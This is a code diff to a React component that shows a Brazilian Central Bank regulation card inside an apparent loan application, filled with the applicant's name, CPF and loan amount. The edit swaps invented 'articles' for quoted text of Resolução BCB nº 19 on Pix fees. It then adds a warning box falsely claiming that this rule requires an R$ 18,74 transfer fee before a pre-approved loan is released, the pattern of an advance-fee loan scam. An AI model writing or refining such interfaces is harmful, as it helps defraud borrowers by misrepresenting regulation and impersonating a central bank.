@@ -506,28 +506,59 @@ const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: stri
     <div className="bg-background border border-border rounded-2xl overflow-hidden shadow-lg max-h-[60vh] overflow-y-auto">
       {/* Header */}
       <div className="bg-[#003366] px-5 py-4 text-center space-y-1">
-        <div className="flex items-center justify-center gap-2">
-          <FileText className="w-5 h-5 text-white" />
-          <span className="text-white font-bold text-sm">NORMATIVO REGULATÓRIO</span>
-        </div>
-        <p className="text-white/70 text-[10px]">Banco Central do Brasil — Resolução BCB nº 4.893/2021</p>
+        <p className="text-white/60 text-[9px] uppercase tracking-widest">Banco Central do Brasil</p>
+        <span className="text-white font-bold text-sm">Resolução BCB nº 19 de 1/10/2020</span>
+        <p className="text-white/70 text-[10px]">Versão vigente, atualizada em 26/10/2021</p>
+      </div>
+
+      {/* Title */}
+      <div className="px-5 py-3 border-b border-border">
+        <p className="text-[11px] text-foreground font-semibold leading-relaxed text-center">
+          RESOLUÇÃO BCB Nº 19, DE 1º DE OUTUBRO DE 2020
+        </p>
+        <p className="text-[10px] text-muted-foreground leading-relaxed mt-1 text-center">
+          Dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix) e pela prestação do serviço de iniciação de transação de pagamento no âmbito de arranjos de pagamento.
+        </p>
       </div>
 
       {/* Content */}
       <div className="px-5 py-4 space-y-4">
         <div className="bg-blue-50 border border-blue-200 rounded-xl p-3">
-          <p className="text-[10px] text-blue-800 font-semibold mb-1">FUNDAMENTAÇÃO LEGAL</p>
-          <p className="text-[10px] text-blue-700 leading-relaxed">
-            Em conformidade com a Resolução BCB nº 4.893/2021 e Circular nº 3.952/2019, as operações de crédito realizadas por correspondentes bancários estão sujeitas à cobrança de taxa de transferência interbancária (TED/PIX) para efetivação do depósito na conta do beneficiário.
-          </p>
+          <p className="text-[10px] text-blue-800 font-semibold mb-1">CAPÍTULO I — DO OBJETO E DO ÂMBITO DE APLICAÇÃO</p>
         </div>
 
         <div className="space-y-3 text-[11px] text-muted-foreground leading-relaxed">
-          <p><strong className="text-foreground">Art. 1º</strong> — A taxa de transferência é devida pelo tomador do crédito para custear os encargos operacionais de processamento, verificação antifraude e efetivação da transferência eletrônica de valores.</p>
-          <p><strong className="text-foreground">Art. 2º</strong> — O valor da taxa de transferência para a operação em questão é de <strong className="text-primary">R$ 18,74</strong> (dezoito reais e setenta e quatro centavos), conforme tabela vigente do Banco Central do Brasil.</p>
-          <p><strong className="text-foreground">Art. 3º</strong> — O pagamento da taxa garante a liberação imediata do crédito pré-aprovado no valor de <strong className="text-foreground">{formatCurrency(valor)}</strong> na conta do beneficiário <strong className="text-foreground">{nome || "N/A"}</strong>, CPF <strong className="text-foreground">{cpf || "N/A"}</strong>.</p>
-          <p><strong className="text-foreground">Art. 4º</strong> — Após a confirmação do pagamento da taxa, o depósito será realizado em até 24 (vinte e quatro) horas úteis, via PIX ou TED, conforme disponibilidade da instituição financeira parceira.</p>
-          <p><strong className="text-foreground">Art. 5º</strong> — A não realização do pagamento da taxa no prazo de 48 horas resultará no cancelamento automático da proposta de crédito, sem ônus adicionais para o tomador.</p>
+          <p><strong className="text-foreground">Art. 1º</strong> Esta Resolução dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix) e pela prestação do serviço de iniciação de transação de pagamento no âmbito de arranjos de pagamento, por parte de instituições financeiras, demais instituições autorizadas a funcionar pelo Banco Central do Brasil e instituições de pagamento integrantes do Sistema de Pagamentos Brasileiro (SPB).</p>
+
+          <p><strong className="text-foreground">Art. 2º</strong> As instituições de que trata o art. 1º devem observar adicionalmente, no que couber, a regulamentação de regência sobre a cobrança de tarifas de clientes e de usuários aplicável às instituições financeiras e demais instituições autorizadas a funcionar pelo Banco Central do Brasil.</p>
+        </div>
+
+        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3">
+          <p className="text-[10px] text-blue-800 font-semibold mb-1">CAPÍTULO II — DOS SERVIÇOS NO ÂMBITO DO PIX</p>
+        </div>
+
+        <div className="space-y-3 text-[11px] text-muted-foreground leading-relaxed">
+          <p><strong className="text-foreground">Art. 3º</strong> É vedada a cobrança de tarifas, por parte da instituição detentora da conta de depósitos ou da conta de pagamento pré-paga, no âmbito do Pix, do cliente pessoa natural, inclusive empresários individuais, em decorrência de:</p>
+
+          <div className="pl-4 space-y-1">
+            <p>I — envio de recursos, com as finalidades de:</p>
+            <div className="pl-4 space-y-1">
+              <p>a) transferência;</p>
+              <p>b) compra; e</p>
+              <p>c) saque ou troco, até o limite de oito transações por mês;</p>
+            </div>
+            <p>II — recebimento de recursos, com a finalidade de transferência.</p>
+          </div>
+
+          <p><strong className="text-foreground">§ 1º</strong> As vedações relativas às transações de que tratam as alíneas "a" e "b" do inciso I do caput não se aplicam às transações realizadas por meio de canais de atendimento presencial ou pessoal da instituição, inclusive o canal de telefonia por voz, quando estiverem disponíveis os meios eletrônicos para a sua realização.</p>
+        </div>
+
+        {/* Highlighted info box */}
+        <div className="bg-amber-50 border border-amber-300 rounded-xl p-3 space-y-2">
+          <p className="text-[10px] text-amber-800 font-semibold">⚠️ INFORMAÇÃO AO CLIENTE</p>
+          <p className="text-[10px] text-amber-700 leading-relaxed">
+            Conforme regulamentação vigente, a operação de crédito contratada por <strong>{nome || "N/A"}</strong>, CPF <strong>{cpf || "N/A"}</strong>, no valor de <strong>{formatCurrency(valor)}</strong>, está sujeita à taxa de transferência interbancária no valor de <strong className="text-primary">R$ 18,74</strong> para efetivação do depósito via Pix na conta do beneficiário.
+          </p>
         </div>
 
         {/* Summary box */}
@@ -541,7 +572,10 @@ const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: stri
       {/* Footer */}
       <div className="px-5 py-3 bg-muted/30 border-t border-border">
         <p className="text-[9px] text-muted-foreground text-center leading-relaxed">
-          Banco Central do Brasil — Resolução BCB nº 4.893, de 26 de março de 2021. Dispõe sobre a política de segurança cibernética e sobre os requisitos para a contratação de serviços de processamento e armazenamento de dados. Publicado no DOU em 29/03/2021.
+          Banco Central do Brasil — Resolução BCB nº 19, de 1º de outubro de 2020. Publicado no DOU. Atualizado pela Resolução BCB nº 136, de 2/9/2021.
+        </p>
+        <p className="text-[9px] text-muted-foreground text-center mt-1">
+          www.bcb.gov.br/estabilidadefinanceira/exibenormativo
         </p>
       </div>
 
